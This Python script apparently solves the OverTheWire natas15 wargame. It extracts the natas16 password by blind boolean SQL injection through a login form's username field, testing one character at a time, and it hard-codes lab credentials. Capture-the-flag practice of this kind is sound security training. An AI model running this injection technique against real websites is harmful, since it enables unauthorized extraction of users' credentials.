import pycurl
import re
import sys
import itertools

try:
    # python 3
    from urllib.parse import urlencode
except ImportError:
    # python 2
    from urllib import urlencode


def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(1, maxlength + 1)))

def check_password(letter, position):
	print 'Checking: %s, Position %d' % (letter, position)
	c = pycurl.Curl()
	c.setopt(c.URL, 'http://natas15.natas.labs.overthewire.org/index.php')
	c.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_BASIC)
	c.setopt(pycurl.USERPWD, "%s:%s" % ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))

	post_data = {'username': 'natas16" and password like binary "%s%%' % (letter)}
	# post_data = {'username': 'natas16" and substr(password, %d, 1)="%s' % (position, letter)}
	# post_data = {'username': 'natas16'}
	# post_data = {'username': 'natas16" and substr(password, 0, 1)="a'}
	# Form data must be provided already urlencoded.
	postfields = urlencode(post_data)
	# Sets request method to POST,
	# Content-Type header to application/x-www-form-urlencoded
	# and data to send in request body.
	c.setopt(c.POSTFIELDS, postfields)

	buffer_ = []
	c.setopt(pycurl.WRITEFUNCTION, buffer_.append)
	c.perform()
	c.close()

	if re.search("This user exists.", ''.join(buffer_)):
		return True
	else:
		return False

password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhm'
cur_pos = len(password)+1

while cur_pos <= 32:
	for letter in bruteforce('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 1):
		if check_password("%s%s" % (password, letter), cur_pos) == True:
			cur_pos += 1
			password = '%s%s' % (password, letter)
			if(len(password) == 32): break
			print 'Current password: %s' % (password)

print "FINAL PASSWORD: %s" % password